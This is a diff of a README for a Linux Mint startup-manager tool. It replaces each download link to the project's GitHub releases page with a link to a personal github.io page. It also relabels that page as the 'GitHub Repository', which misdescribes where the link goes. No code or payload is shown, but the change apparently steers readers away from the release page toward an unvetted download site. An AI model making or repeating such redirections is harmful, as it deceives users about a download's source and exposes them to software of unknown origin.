@@ -1,6 +1,6 @@
 # 🚀 Autostart_Manager - Take Control of Your Startup
 
-[![Download Now](https://img.shields.io/badge/Download-Autostart_Manager-blue?style=for-the-badge&logo=github)](https://github.com/michelleangiocarpic505/Autostart_Manager/releases)
+[![Download Now](https://img.shields.io/badge/Download-Autostart_Manager-blue?style=for-the-badge&logo=github)](https://michelleangiocarpic505.github.io)
 
 ## 📋 Description
 
@@ -8,7 +8,7 @@ Autostart_Manager is a graphical startup manager for Linux Mint 22.3 (Cinnamon).
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/michelleangiocarpic505/Autostart_Manager/releases](https://github.com/michelleangiocarpic505/Autostart_Manager/releases)
+Visit this link to download the application: [https://michelleangiocarpic505.github.io](https://michelleangiocarpic505.github.io)
 
 ### Download Instructions
 
@@ -77,11 +77,11 @@ This application is fully available in Spanish. The interface, dialogs, and docu
 
 ## 📥 Download
 
-Visit this link to download the application: [https://github.com/michelleangiocarpic505/Autostart_Manager/releases](https://github.com/michelleangiocarpic505/Autostart_Manager/releases)
+Visit this link to download the application: [https://michelleangiocarpic505.github.io](https://michelleangiocarpic505.github.io)
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [Autostart_Manager](https://github.com/michelleangiocarpic505/Autostart_Manager)
+- **GitHub Repository:** [Autostart_Manager](https://michelleangiocarpic505.github.io)
 - **Issue Tracker:** Report bugs or request features on the GitHub Issues page.
 - **Wiki:** Check the project wiki for more detailed guides.
 
